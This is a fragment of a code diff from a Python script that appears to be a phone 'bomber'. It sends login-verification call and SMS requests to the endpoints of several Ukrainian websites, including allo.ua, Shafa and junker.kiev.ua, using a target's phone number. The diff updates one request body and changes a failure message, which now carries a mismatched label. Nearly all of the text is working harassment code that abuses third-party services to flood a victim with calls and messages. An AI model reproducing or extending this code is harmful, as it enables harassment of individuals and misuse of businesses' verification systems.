@@ -134,7 +134,7 @@ def start():
         try:
             requests.post(
                 "https://allo.ua/ua/customer/account/sendLoginVerificationCall/?isAjax=1&currentLocale=uk_UA", 
-                data={"telephone": phone}, timeout=2
+                json={'country': "UA", 'lang': "ru", 'phone': phone, 'accept_terms': 's'}, timeout=2
             )
             print(nice + "ALLO Звонок отправлено!" + Style.RESET_ALL)
         except:
@@ -152,7 +152,7 @@ def start():
             )
             print(nice + "Shafa отправлено!" + Style.RESET_ALL)
         except:
-            print(fail + "Shafa не отправлен" + Style.RESET_ALL)
+            print(fail + "IZI не отправлен" + Style.RESET_ALL)
         try:
             requests.post(
                 "https://junker.kiev.ua/postmaster.php",
